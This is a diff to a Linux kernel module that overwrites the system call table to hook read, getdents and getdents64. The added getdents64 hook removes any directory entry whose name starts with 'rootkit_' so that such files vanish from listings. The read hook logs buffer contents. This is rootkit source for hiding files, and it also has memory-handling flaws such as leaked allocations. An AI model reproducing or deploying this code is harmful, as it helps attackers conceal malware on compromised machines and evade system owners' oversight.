@@ -7,9 +7,19 @@
 #include <linux/types.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
+#include <asm/uaccess.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 
+// since we had no problems without get/put, we commented it out
+// #define USE_MODULE_GET_PUT
+#ifdef USE_MODULE_GET_PUT
+#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -EAGAIN;}
+#define OUR_MODULE_PUT module_put(THIS_MODULE)
+#else
+#define OUR_TRY_MODULE_GET 
+#define OUR_MODULE_PUT 
+#endif
 
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
@@ -42,49 +52,82 @@ void make_page_readonly(long unsigned int _addr){
 // hooked functions
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
-    if (!try_module_get(THIS_MODULE)){
-        return -1;
-    }
-    if (*buf && count > 1024){
-        printk(KERN_INFO "hooked_read(%d, %s, %d)", fd, buf, count);
-    }
+    char __user* cur_buf;
+    OUR_TRY_MODULE_GET;
     retval = original_read(fd, buf, count);
-    module_put(THIS_MODULE);
+    cur_buf = buf;
+    if (retval > 0){
+        printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
+    }
+    OUR_MODULE_PUT;
     return retval;
 }
 
 asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
     ssize_t result;
-    result = original_getdents(fd, dirent, count);
-    /* struct linux_dirent __user *cur_dirent; 
     printk(KERN_INFO "our very own hooked_getdents\n");
-    printk(KERN_INFO "Here go the files:\n");
-    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
-    cur_dirent = dirent;
-    for (f=0; f<count; ++f){
-        printk(KERN_INFO "%s\n", dirent->d_name);
-        dirent = dirent + dirent->d_reclen;
-    }
-    printk(KERN_INFO "----------------- End of file list ------------------------------------"); */
+    result = original_getdents(fd, dirent, count);
     return result;
 }
 
 asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-    struct linux_dirent64 __user *cur_dirent; 
+    // declarations
+    char hidename[]="rootkit_";
     ssize_t result;
-    int bpos;
-    printk(KERN_INFO "our very own hooked_getdents64\n");
-    result = original_getdents64(fd, dirent, count);
-    printk(KERN_INFO "Here go the files %d :\n", result);
-    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
-    cur_dirent = dirent;
-    for (bpos=0; bpos < result;){
-        cur_dirent = (struct linux_dirent64*)(dirent + bpos);
-        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
-        bpos += cur_dirent->d_reclen;
+    unsigned long cur_len = 0;
+    ssize_t remaining_bytes = 0;
+    struct linux_dirent64 * orig_dirent,* head,* prev;
+    char * p=NULL;
+
+    // retrieve original data and 
+    // allocate memory for intermediate results, 
+    // since we will manipulate data on intermediate memory regions
+    result = (*original_getdents64) (fd, dirent, count);
+    remaining_bytes = result;
+    orig_dirent=(struct linux_dirent64 *)kmalloc(remaining_bytes, GFP_KERNEL);
+    p=(char*)orig_dirent;
+    if(copy_from_user(orig_dirent,dirent,remaining_bytes)) {
+        printk(KERN_INFO "copy error\n");
+        return result;
     }
-    printk(KERN_INFO "----------------- End of file list ------------------------------------");
+    prev = head = orig_dirent;
+    while(remaining_bytes > 0) {
+        cur_len = orig_dirent->d_reclen;
+        remaining_bytes -= cur_len;
+        if(0==memcmp(hidename, orig_dirent->d_name, strlen(hidename))) {
+            printk(KERN_INFO "find file:%s\n",orig_dirent->d_name);
+            if(head==orig_dirent) {
+                head=(struct linux_dirent64 *)((char*)orig_dirent+cur_len);
+                orig_dirent = prev = head;
+                result -= cur_len;
+                continue;
+            }
+            else {
+                prev->d_reclen += cur_len;
+                memset((char*)orig_dirent,0,cur_len);
+            }
+            printk(KERN_INFO "hide it\n");
+        }
+        else {
+            prev=orig_dirent;
+        }
+
+        if(remaining_bytes){
+            orig_dirent= (struct linux_dirent64 *) ((char *)prev + prev->d_reclen);
+        }
+
+    }
+
+    // copy data back and return result
+    if(copy_to_user (dirent,head,result)){
+printk (KERN_INFO "error copying data back\n");
+return result;
+    }
+    kfree(p);
     return result;
+
+
+
 }
 
 /* Hooks the read system call. */
@@ -97,7 +140,7 @@ void hook_functions(void){
   // remove write protection
   make_page_writable((long unsigned int) ptr_sys_call_table);
   // replace function pointers! YEEEHOW!!
-  sys_call_table[__NR_read] = (void*) hooked_read;
+  // sys_call_table[__NR_read] = (void*) hooked_read;
   sys_call_table[__NR_getdents] = (void*) hooked_getdents;
   sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
 }
